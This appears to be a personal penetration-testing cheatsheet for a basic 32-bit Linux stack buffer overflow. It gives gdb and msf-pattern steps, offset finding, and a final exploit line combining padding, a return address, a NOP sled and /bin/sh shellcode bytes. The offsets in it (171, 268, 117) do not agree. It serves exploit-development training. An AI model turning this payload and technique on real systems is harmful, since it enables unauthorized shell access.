# Simple
- Disable ASLR
1. Determine Buffer Size till EIP overflows with A
	- Via fuzzing
	- Buffer Size: 200
2.  Create msf-pattern
	```
	msf-pattern_create -l 200
	Pattern:
	run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
	```
3. Use `env`
	```
	# do not use ./
	env - gdb /path/to/file
	show env
	unset env LINES
	unset env COLUMNS
	show env
	```
4.  Determine Pattern Address & Return Address
	```
	# Determine Return Address 
	# Address must not have badChars
	i r # Look at ESP
	i r esp
	x/40x $esp
	
	# Determine Pattern Address 
	# Or you can just look at where program crashed <0xADDRESS in ?? ()>
	i r eip
	```
	- Pattern Address: `0x41376641`
	- Return Address: `0xbffff630`
		- Little Endian: `\x30\xf6\xff\xbf`
5. Determine EIP offset
	```
	msf-pattern_offset -q 0x41376641
	```
	- EIP offset: 171
6. Ensure EIP offset
	```
	run  $(python -c 'print "A" * 171 + "B" * 4 + "C" * 200')
	```
7. Determine badChars 
	- Unable to use found returnAdd yet, unless we are sure it does not contain badChars `\x00`
	```
	run $(python -c 'print "A" * 268 + "B" * 4 + "badChars"')
	x/40x $esp
	
	buffer = "A" * offset + "B" * 4 + badChars
	```
	- badChars: ``
8. [[pentest/Cheatsheet/Linux/Linux BOF/Shellcode]]
	```
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
	```
9. Exploit
	```
	env - /path/to/file $(python -c 'print "A" * 117  + "\x30\xf6\xff\xbf" + "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
	
	padding + returnAdd + NOP + shellcode
	```
	- If it does not work, play around with the returnAdd & try to use different shell codes
		- Check if returnAdd has any badchars `\x00\x20`
		- eg; if `\x20\x30\x40\x50` is your return add, but `\x20` is a bad char, use `\x21` instead
		- If there is make sure to increase NOP size
		